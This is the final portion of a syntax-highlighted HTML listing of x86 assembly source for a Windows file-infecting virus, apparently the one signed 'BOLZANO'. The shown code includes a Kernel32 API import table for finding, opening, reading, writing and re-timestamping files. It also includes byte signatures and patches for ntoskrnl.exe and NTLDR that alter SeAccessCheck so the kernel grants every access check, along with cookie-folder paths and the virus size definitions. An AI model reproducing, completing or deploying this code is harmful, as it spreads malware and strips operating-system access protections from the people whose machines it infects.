             </span><span class="sc6">sub</span><span class="sc0">          </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0"> </span><span class="sc1">; j'y tiens !</span><span class="sc0">

             </span><span class="sc6">ret</span><span class="sc0">



</span><span class="sc1">; At the moment, other API than the Kernel32 are not supported</span><span class="sc0">


</span><span class="sc5">Kernel32_API</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc5">CreateThread</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'CreateThread'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">DeleteFileA</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'DeleteFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">DosDateTimeToFileTime</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'DosDateTimeToFileTime'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">FindClose</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'FindClose'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">FindFirstFileA</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'FindFirstFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">FindNextFileA</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'FindNextFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">GetCurrentDirectoryA</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'GetCurrentDirectoryA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">GetCurrentThread</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'GetCurrentThread'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">GetFileTime</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'GetFileTime'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">GetDriveTypeA</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'GetDriveTypeA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">GetLocalTime</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'GetLocalTime'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">GetTickCount</span><span class="sc4">:</span><span class="sc0">


             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'GetTickCount'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">FileTimeToDosDateTime</span><span class="sc4">:</span><span class="sc0">


             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'FileTimeToDosDateTime'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">SetFileAttributesA</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'SetFileAttributesA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">SetFileTime</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'SetFileTime'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">SetThreadPriority</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'SetThreadPriority'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">_lclose</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'_lclose'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">_llseek</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'_llseek'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">_lopen</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'_lopen'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">_lread</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'_lread'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">_lwrite</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'_lwrite'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">W9x_GPA_Key</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0C2</span><span class="sc4">,</span><span class="sc2">04</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc2">57</span><span class="sc4">,</span><span class="sc2">6A</span><span class="sc4">,</span><span class="sc2">22</span><span class="sc4">,</span><span class="sc2">2Bh</span><span class="sc4">,</span><span class="sc2">0D2</span><span class="sc0">

</span><span class="sc5">WNT_GPA_Key</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0C2</span><span class="sc4">,</span><span class="sc2">04</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc2">55</span><span class="sc4">,</span><span class="sc2">8Bh</span><span class="sc4">,</span><span class="sc2">4C</span><span class="sc4">,</span><span class="sc2">24</span><span class="sc4">,</span><span class="sc2">0C</span><span class="sc0">

</span><span class="sc5">NTFile1</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'\NTLDR'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">; OS Loader</span><span class="sc0">

</span><span class="sc5">NTFile2</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'\WINNT\system32\ntoskrnl.exe'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">NTSig1</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">3Bh</span><span class="sc4">,</span><span class="sc2">46</span><span class="sc4">,</span><span class="sc2">58</span><span class="sc4">,</span><span class="sc2">74</span><span class="sc4">,</span><span class="sc2">07</span><span class="sc0">

</span><span class="sc5">NTSig2</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">8A</span><span class="sc4">,</span><span class="sc2">0C3</span><span class="sc4">,</span><span class="sc2">5F</span><span class="sc4">,</span><span class="sc2">5E</span><span class="sc4">,</span><span class="sc2">5Bh</span><span class="sc4">,</span><span class="sc2">5Dh</span><span class="sc4">,</span><span class="sc2">0C2</span><span class="sc4">,</span><span class="sc2">28</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">  </span><span class="sc1">; SeAccessCheck</span><span class="sc0">

</span><span class="sc5">NTPatch1</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">3Bh</span><span class="sc4">,</span><span class="sc2">46</span><span class="sc4">,</span><span class="sc2">58</span><span class="sc4">,</span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc2">07</span><span class="sc0">               </span><span class="sc1">; replace jz by jmp</span><span class="sc0">

</span><span class="sc5">NTPatch2</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B0</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">5F</span><span class="sc4">,</span><span class="sc2">5E</span><span class="sc4">,</span><span class="sc2">5Bh</span><span class="sc4">,</span><span class="sc2">5Dh</span><span class="sc4">,</span><span class="sc2">0C2</span><span class="sc4">,</span><span class="sc2">28</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">  </span><span class="sc1">; replace mov al,bl</span><span class="sc0">
                                                          </span><span class="sc1">; by mov al,01</span><span class="sc0">
</span><span class="sc5">Dir1</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'\WINDOWS\Cookies\*.*'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Dir2</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'\WINNT\Cookies\*.*'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">RMul</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc2">07FFFFD9h</span><span class="sc0">

</span><span class="sc5">RDiv</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc2">0FFFFFFFBh</span><span class="sc0">



</span><span class="sc5">K32_Base</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">RandNb</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">ThreadID</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">SearchHandle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">CurDirEnd</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">FileHandle</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">FileDate</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">FileTime</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">SelF</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">B1A</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">B2A</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">



</span><span class="sc5">CurrentDir</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">100</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Buffer1</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">80</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Buffer2</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">600</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">3</span><span class="sc4">)</span><span class="sc0">


             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'  BOLZANO  '</span><span class="sc0">


</span><span class="sc5">VE</span><span class="sc4">:</span><span class="sc0">



</span><span class="sc5">VSIZE</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">          </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">

</span><span class="sc5">RawVSize</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">          </span><span class="sc5">VSIZE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">VSIZE</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">


</span><span class="sc5">VIRUS</span><span class="sc0">        </span><span class="sc9">ENDS</span><span class="sc0">


</span><span class="sc9">END</span><span class="sc0">          </span><span class="sc5">VS</span><span class="sc0">

</span></div></body>
</html>
